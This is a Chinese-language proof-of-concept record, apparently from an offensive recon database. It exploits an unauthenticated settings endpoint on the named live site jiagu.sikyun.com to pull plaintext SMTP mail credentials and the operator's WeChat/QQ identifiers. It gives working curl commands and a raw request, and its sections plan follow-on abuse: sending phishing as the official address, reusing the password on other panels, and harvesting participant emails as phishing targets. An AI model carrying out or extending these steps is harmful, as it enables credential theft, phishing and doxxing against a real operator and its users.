# jiagu.sikyun.com /api.php?action=init 未授权返回 settings 全量配置（明文 SMTP 企业邮口令 + 运营者身份）

- **code**: jiagu-sikyun-api-php-action-init-unauth-settings-disclosure
- **kind**: poc
- **category**: info-leak
- **component**: jiagu.sikyun.com 自研 PHP 枢纽站（api.php 单入口 action 路由）
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: task#616，2026-11-06，本机 Windows curl.exe --noproxy '*' 直连 https://jiagu.sikyun.com/api.php?action=init 实测：HTTP 200，body 含 "smtp_pass":"<明文>","smtp_user":"admin@sktime.cn","wechat":"BuHui0971","record_number":"皖ICP备2025092316号"；同一时刻 GET / 首页 HTML 全文不含 smtp 字段，双向对照成立，故判定为 init 接口单独未授权泄露（非首页自带）。产物 D:\ARTEX\data\tasks\616\i10687\init.json，来源 work#i10687。
- **path**: pocs/jiagu-sikyun-api-php-action-init-unauth-settings-disclosure/poc.http
- **tags**: unauthorized,info-leak,settings,smtp,明文口令,api.php,action-init,php,身份信息,备案号
- **created_at**: 2026-11-05T23:02:54.227Z
- **engine**: https://jiagu.sikyun.com
- **found_by**: recon

## 描述

站点的前端初始化接口 /api.php?action=init 未做任何会话校验，直接返回后端 settings 表整行：腾讯企业邮 SMTP 发信账号与明文口令、运营者微信/QQ/QQ群、ICP 备案号，以及抽奖参与者邮箱等业务数据。可用于冒用官方邮局发信（钓鱼/投递）、口令派生与运营者身份溯源。同站点首页 HTML 不含这些字段，属接口单独泄露。字段特征核查方法参见条码 118「配置类接口 settings/config/option 明文回显」，本条给的是可直接复现的具体接口。

## 用法

```
前置：目标可达，无需 Cookie / 账号 / Referer。
1) 基线对照（确认是接口独有泄露，不是首页自带）：
   curl -sS -k --noproxy '*' https://TARGET/ | grep -i smtp   → 期望无输出
2) 取配置：
   curl -sS -k --noproxy '*' -D - "https://TARGET/api.php?action=init"
判据：HTTP 200 且 body 为 {"success":true,"data":{"settings":{...}}}，其中同时出现 smtp_host / smtp_port / smtp_user / smtp_pass。
3) 取到 smtp_user + smtp_pass 后用 ssl://smtp.exmail.qq.com:465 做 AUTH LOGIN 发信验证（发给自己一封，看是否被收下且 From 为官方地址）。
4) 顺带收割同响应的 wechat / qq / qq_group / record_number / 参与者邮箱，做运营者身份与同族资产扩展。
注意：
- 必须 --noproxy '*'（本机挂着 HTTP 代理会把结论污染成 502/超时）；HTTPS 证书链异常时加 -k，但先确认不是中间人。
- 只在 GET 上验证，别去 POST 同 action，避免触发写配置。
- 若返回 success:false 或空 settings，多半是 Host/前置反代没对上真实站点，改用 --resolve 固定源站 IP 再试。
- 明文口令会随运营方改配置变化，复用前先重读一次。
```

## 正文

```
# jiagu.sikyun.com 未授权 init 接口信息泄露（实测复现）

## 前置条件
- 目标 https://jiagu.sikyun.com 可达；无 Cookie、无账号、无 Referer 要求。
- 直连出口（curl.exe 加 --noproxy "*"），避免本地代理污染。

## 请求（原始包）
GET /api.php?action=init HTTP/2
Host: jiagu.sikyun.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0 Safari/537.36
Accept: */*

## 命中响应（HTTP 200，节选）
{"success":true,"message":"ok","data":{"settings":{
  "smtp_host":"ssl://smtp.exmail.qq.com",
  "smtp_port":"465",
  "smtp_user":"admin@sktime.cn",
  "smtp_pass":"<REDACTED>",
  "wechat":"BuHui0971",
  "qq":"2572508572",
  "qq_group":"1037867841",
  "record_number":"皖ICP备2025092316号",
  ...}}}

## 判据（三条同时成立才算数）
1. GET /api.php?action=init → 200，success:true，data.settings 存在；
2. 响应中同时出现 smtp_host / smtp_port / smtp_user / smtp_pass 四个键，且 smtp_pass 是可读明文（非哈希、非 ***）；
3. 对照：GET / 首页 HTML 全文 grep smtp 无命中 —— 证明是 init 接口单独泄露，而非首页自有数据。

## 拿到之后的正确动作
- 冒用发信验证：ssl://smtp.exmail.qq.com:465 + AUTH LOGIN(smtp_user/smtp_pass)，发一封到自有邮箱，看是否成功入队且信封 From 为官方地址 → 可做官方口吻钓鱼/投递。
- 口令派生：用该口令去试同运营方其他面板/邮箱/后台 1~2 次（不要批量，防锁定）；企业邮口令重置会连带影响运营方，只读优先。
- 身份与资产扩展：wechat / qq / qq_group / record_number（备案号可查同主体全部域名），参与者邮箱可做后续钓鱼面。

## 失败时的常见原因
- 没加 --noproxy：走本地代理被 502/超时 → 结论假阴性。
- 用错 Host / 打的是 CDN 未回源：换成 --resolve jiagu.sikyun.com:443:<源站IP> 固定。
- 返回 success:false 但 200：接口通了但 action 白名单变了，回来重新枚举 action（同站还有 action=xxx 系列，可参照站群惯例逐个试）。
- smtp_pass 变成 ***：运营方上了脱敏补丁 → 降级为"仅身份泄露"。

## 影响面
明文 SMTP 口令 → 可用官方邮局发信（钓鱼、伪造通知、投递 APK/礼品卡链接）；wechat/qq/qq_group → 社工与同团伙定位；备案号 → 同subject域名测绘；参与者邮箱 → 二次钓鱼名单。缺席：站点本身无鉴权，无需组合其它漏洞。

```
